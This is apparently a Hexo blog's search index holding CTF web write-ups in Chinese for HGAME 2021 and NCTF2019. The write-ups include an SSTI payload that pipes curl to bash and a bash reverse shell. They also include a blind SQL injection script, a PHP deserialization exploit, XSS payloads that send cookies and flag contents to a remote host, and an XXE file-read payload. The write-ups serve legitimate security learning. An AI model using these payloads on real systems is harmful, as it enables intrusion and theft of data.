<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="2021/02/25/hello-world/"/>
      <url>2021/02/25/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2021 Writeup</title>
      <link href="2021/02/20/HGAME%202021%20Writeup/"/>
      <url>2021/02/20/HGAME%202021%20Writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-Week3"><a href="#Level-Week3" class="headerlink" title="Level - Week3"></a>Level - Week3</h2><h3 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h3><p>考点：简单python-SSTI</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230828.png" alt="img"></p><p>题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230954.png" alt="image-20210214230953251"></p><p>最为常规的payload：</p><pre><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()&#125;&#125;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('ls /').read()&#125;&#125;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('curl ip|bash').read()&#125;&#125;</code></pre><p>因为命令执行处有waf，所以可以选择直接弹shell：</p><pre><code>nc -lvnp 8888bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1</code></pre><p>姿势还是比较常规；</p><p>分享一个从<code>[].__class__.__mro__[1].__subclasses__()</code>查找模块位置的脚本：</p><pre><code class="python">#python 3import restr = &#39;&#39;&#39;[回显内容]&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):      if &#39;catch_warnings&#39; in list[i]:            print(i)            break</code></pre><h3 id="iki-Jail"><a href="#iki-Jail" class="headerlink" title="iki-Jail"></a>iki-Jail</h3><p>考点：MySQL注入，单引号逃逸</p><p>熟悉的登录框，熟悉的sql注入</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130850.png" alt="image-20210215130849132"></p><p>发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。</p><p>于是直接使用bp对<code>login.php</code>发包；</p><p>进行了简单的fuzz，过滤如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131112.png" alt="image-20210215131110567"></p><p>由单双引号过滤想到了<code>\</code>逃逸单引号，当我们用户名输入<code>admin\</code>的时候，语句变成了：</p><pre><code class="sql">SELECT * FROM user WHERE username=&#39;admin\&#39; AND password=&#39;xxx&#39;</code></pre><p>那么<code>xxx</code>就变成了sql语句执行，造成了注入；</p><p>结果发现只能延时注入：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131035.png" alt="image-20210215131033385"></p><p>exp：</p><pre><code class="python">#python3,wh1sperimport requestsimport timehost = &#39;https://jailbreak.liki.link/login.php&#39;def mid(bot, top):    return (int)(0.5*(top+bot))def transToHex(flag):    res = &#39;&#39;    for i in flag:        res += hex(ord(i))    res = &#39;0x&#39; + res.replace(&#39;0x&#39;, &#39;&#39;)    return resdef sqli():    name = &#39;&#39;    for j in range(1, 200):        top = 126        bot = 32        while top &gt; bot:            babyselect = &#39;(database())&#39;#week3sqli            babyselect = &quot;(select group_concat(table_name) from information_schema.TABLES where table_schema like database())&quot;#u5ers            babyselect = &quot;(select group_concat(column_name) from information_schema.columns where table_name like 0x7535657273)&quot;#usern@me,p@ssword            babyselect = &quot;(select `p@ssword` from week3sqli.u5ers)&quot;#sOme7hiNgseCretw4sHidd3n            babyselect = &quot;(select `usern@me` from week3sqli.u5ers)&quot;#admin            payload = &quot;^(if((ascii(substr(&#123;&#125;,&#123;&#125;,1))&gt;&#123;&#125;),1,sleep(2)))#&quot;.format(babyselect, j, mid(bot, top))            data = &#123;                &quot;username&quot;: &quot;admin\\&quot;,                &quot;password&quot;: payload.replace(&#39; &#39;, &#39;/**/&#39;)                #^(if((ascii(1)&gt;55),sleep(3),sleep(3)))#这个确实延时成功了            &#125;            try:                start = time.time()                r = requests.post(url=host, data=data)                print(data)                print(time.time()-start)                if time.time()-start &lt; 1.5:                    bot = mid(bot, top) + 1                else:                    top = mid(bot, top)            except:                continue        name += chr(top)        print(name)if __name__ == &#39;__main__&#39;:    sqli()    #hgame&#123;7imeB4se_injeCti0n+hiDe~th3^5ecRets&#125;</code></pre><p>hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}</p><h3 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h3><p>考点：PHP反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215121944.png" alt="image-20210215121933780"></p><p>题目是一个类似于抽卡的网站，描述里面说”r4u用git部署到了自己的服务器上”，那么自然而然Githack把源码hack下来。</p><p><a href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DArknights.zip">source.zip</a></p><p>在<code>simulator.php</code>我们可以看到有很多类，其中第146行</p><pre><code class="php">class Eeeeeeevallllllll&#123;    public $msg=&quot;坏坏liki到此一游&quot;;    public function __destruct()    &#123;        echo $this-&gt;msg;    &#125;&#125;</code></pre><p>有一个echo操作，那么我们全局搜索<code>__toString</code>。第93行：</p><pre><code class="php">class CardsPool&#123;    ……            public function __toString()&#123;        return file_get_contents($this-&gt;file);    &#125;&#125;</code></pre><p>pop链很明确，就看如何触发反序列化了。</p><p>第137行<code>Session::extract()</code>:</p><pre><code class="php">public function extract($session)&#123;        $sess_array = explode(&quot;.&quot;, $session);        $data = base64_decode($sess_array[0]);        $sign = base64_decode($sess_array[1]);        if($sign === md5($data . self::secret_key))&#123;            $this-&gt;sessiondata = unserialize($data);        &#125;else&#123;            unset($this-&gt;sessiondata);            die(&quot;go away! you hacker!&quot;);        &#125;</code></pre><p>他会把session的<code>.</code>前面的内容反序列化，并且会做一个加盐的判断，但是密钥在103行已经给了</p><pre><code class="php">const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;</code></pre><p>那么我们可以编写一个exp：</p><pre><code class="php">&lt;?phpclass Eeeeeeevallllllll&#123;    public $msg = &#39;a&#39;;&#125;class CardsPool&#123;    public $cards;    private $file = &#39;flag.php&#39;;&#125;$pop = new Eeeeeeevallllllll();$pop-&gt;msg = new CardsPool();//echo serialize($pop);$key = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;$sign = md5(serialize($pop).$key);$payload = base64_encode(serialize($pop)).&#39;.&#39;.base64_encode($sign);echo $payload;/*$sess_array = explode(&quot;.&quot;, $payload);$data = base64_decode($sess_array[0]);echo $data,&quot;\n&quot;;$sign = base64_decode($sess_array[1]);echo $sign,&quot;\n&quot;;if($sign === md5($data . $key))&#123;    unserialize($data);&#125;else&#123;    echo $sign;    die(&quot;go away! you hacker!&quot;);&#125;*/</code></pre><p>发送session即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130724.png" alt="image-20210215130722662"></p><h3 id="Post-to-zuckonit2-0"><a href="#Post-to-zuckonit2-0" class="headerlink" title="Post to zuckonit2.0"></a>Post to zuckonit2.0</h3><p>考点：XSS</p><p>网站是一个创建笔记的站点，存在XSS漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216130625.png" alt="image-20210216130624020"></p><p>在<code>/static/www.zip</code>给了源码：<a href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0.zip">source.zip</a></p><p>和week2的XSS比起来多一个功能，可以替换批量字符串，并且在<code>/preview</code>查看替换的结果</p><p>审计源码，在添加留言的存在一个waf：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216125153.png" alt="image-20210216125152416"></p><p>跟进函数：</p><pre><code class="python">def escape_index(original):    content = original    content_iframe = re.sub(r&quot;^(&lt;?/?iframe)\s+.*?(src=[\&quot;&#39;][a-zA-Z/]&#123;1,8&#125;[\&quot;&#39;]).*?(&gt;?)$&quot;, r&quot;\1 \2 \3&quot;, content)#只留src属性    if content_iframe != content or re.match(r&quot;^(&lt;?/?iframe)\s+(src=[\&quot;&#39;][a-zA-Z/]&#123;1,8&#125;[\&quot;&#39;])$&quot;, content):        return content_iframe    else:        content = re.sub(r&quot;&lt;*/?(.*?)&gt;?&quot;, r&quot;\1&quot;, content)        return content</code></pre><p>可以看到只允许我们添加类似于<code>&lt;iframe scr=&quot;xxx&quot;&gt;</code>的标签，并且<code>xxx</code>限制在1-8位，显然没办法直接执行JS。</p><p>不过我们可以添加<code>&lt;iframe scr=&quot;/preview &quot;&gt;</code>来使得index能直接看到<code>/preview</code>页面：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124755.png" alt="image-20210216124754639"></p><p>再通过字符串替换功能，把<code>xxx</code>换成<code>javascript:xxxxx</code>，形成<code>&lt;iframe src=&#39;javascript:alter(1)&#39;&gt;</code>即可XSS</p><p>payload：</p><pre><code class="js">javascript:document.write(atob(&#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+&#39;));</code></pre><p>小手一抖，cookie到手：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124700.png" alt="image-20210216124651414"></p><p>hgame{simple_csp_bypass&amp;a_small_mistake_on_the_replace_function}</p><h3 id="Post-to-zuckonit-another-version"><a href="#Post-to-zuckonit-another-version" class="headerlink" title="Post to zuckonit another version"></a>Post to zuckonit another version</h3><p>考点：XSS，HttpOnly绕过</p><p>说是绕<code>HttpOnly</code>，实则并没有绕；</p><p>相比于上一道XSS：</p><ol><li><p>增加了HttpOnly，使得我们直接用js不能直接获取到本地cookie；</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173620.png" alt="image-20210220173619352"></p></li><li><p>修改了功能，把直接替换字符串换成了查找字符串</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173858.png" alt="image-20210220173856459"></p></li></ol><p>依然在<code>static/www.zip</code>给出了源码：<a href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0_another_version.zip">source.zip</a></p><p>源码大同小异，甚至连waf都没变，单独在字符串替换功能上修改为正则匹配并且在两端加<code>&lt;b&gt;</code>标签，得到高亮效果</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174349.png" alt="image-20210220174348492"></p><p>如果按照正常思维来查找’a’字符串的话，效果就如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174512.png" alt="image-20210220174510622"></p><p>但是我们应当注意到，这个高亮实际上还是由<code>String.prototype.replace()</code>方法来进行<strong>正则替换</strong>的，那么我们如果输入<code>.*</code>之类的关键词进行高亮就会出现意想不到的效果：<br><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174753.png" alt="image-20210220174752450"></p><p>没错，因为正则替换让我们得以有机可乘</p><p>思路还是一样，先利用替换构造好XSS，再利用<code>&lt;iframe src=&#39;/preview&#39;&gt;</code>来触发0-click</p><p>payload：</p><pre><code>&lt;iframe src=&#39;/preview&#39;&gt;&lt;iframe src=&#39;AAA&#39; &gt;</code></pre><p>替换的payload：</p><pre><code>AAA(&#39;srcdoc=&#39;&amp;lt;img src=1 onerror=document.write(atob(&amp;#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==&amp;#x27;));&amp;gt;&#39;)*</code></pre><p>替换之后其实是这样：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175915.png" alt="image-20210220175913943"></p><p>实际上是利用了iframe标签的srcdoc属性和HTML实体编码来绕过</p><pre><code>&lt;iframe src=&quot;&lt;b class=&amp;quot;search_result&amp;quot;&gt;AAA(&quot; srcdoc=&quot;&lt;img src=1 onerror=document.write(atob(&#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==&#39;));&gt;&quot; )*&lt;=&quot;&quot; b=&quot;&quot;&gt;&#39; &gt;&lt;/iframe&gt;</code></pre><p>结果一目了然；</p><p>而iframe里面<code>&lt;script&gt;</code>指向的JS：</p><pre><code class="js">xmlhttp = new XMLHttpRequest();//是否能跨域xmlhttp.withCredentials = true;xmlhttp.onreadystatechange = function() &#123;    if (xmlhttp.readyState == 4) &#123;        location.href = &#39;http://ip/?cookie=&#39; + btoa(xmlhttp.responseText)        //得用btoa()进行base64编码，不然flag会很神必        //尝试getAllResponseHeaders()不行，因为HttpOnly的Set-Cookie头不适用    &#125;&#125;;//设置连接信息//第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post//第二个参数表示请求的url地址，get方式请求的参数也在url中//第三个参数表示采用异步还是同步方式交互，true表示异步xmlhttp.open(&#39;GET&#39;, &#39;/flag&#39;, true);//4.发送数据，开始和服务器端进行交互//同步方式下，send这句话会在服务器段数据回来后才执行完//异步方式下，send这句话会立即完成执行xmlhttp.send(&#39;&#39;);</code></pre><p>不能绕HttpOnly来获取cookie，但是我们可以直接让admin请求<code>/flag</code>，把responseText发给我们就行了；</p><p>这个是本地打的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220172735.png" alt="image-20210220172727362"></p><p>大手一抖，flag到手：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175431.png" alt="image-20210220175430475"></p><p>因为flag里面出题人故意放了<code>&amp;</code>字符让我们踩坑，打出来的responseText需要base64编码。</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175441.png" alt="image-20210220172930232"></p><p>下面这个才对。</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175445.png" alt="image-20210220173313149"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019_Fakexml</title>
      <link href="2019/12/27/NCTF2019_Fakexml/"/>
      <url>2019/12/27/NCTF2019_Fakexml/</url>
      
        <content type="html"><![CDATA[<p>NCTF2019web1:fake xml cookbook_writeup</p><p>By:0xfxxker_wh1sper</p><p>解题思路：</p><p>这道题名字是XML，关于XML我知道的只有两种手段，一是普通XML注入，通过闭合各种标签然后植入恶意代码运行脚本，但是一般这种手段实在攻击者能够掌握password字段并且能够保存到服务器当中去才能够添加一个新的admin账户（当时也在这里卡了很久），还有一种就是XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用点是外部实体，如果能注入，外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）。</p><p>用户名，密码随便试一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164837.png" alt="img"></p><p>抓包，分析:</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164848.png" alt="img"></p><p>于是我构造了如下XML外部实体，大概是这样</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164909.png" alt="img"></p><p>注意事项：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE dy（这里有一个空格） [&lt;!ENTITY dy SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;dy;（分号）&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p>通过POST请求发过去</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164914.png" alt="img"></p><p>服务器说登录失败，并且返回&amp;dy，也就是/flag的内容</p><p>这里挂一篇关于xxe的学习文档：<a href="http://url.cn/54Ucm5w">http://url.cn/54Ucm5w</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
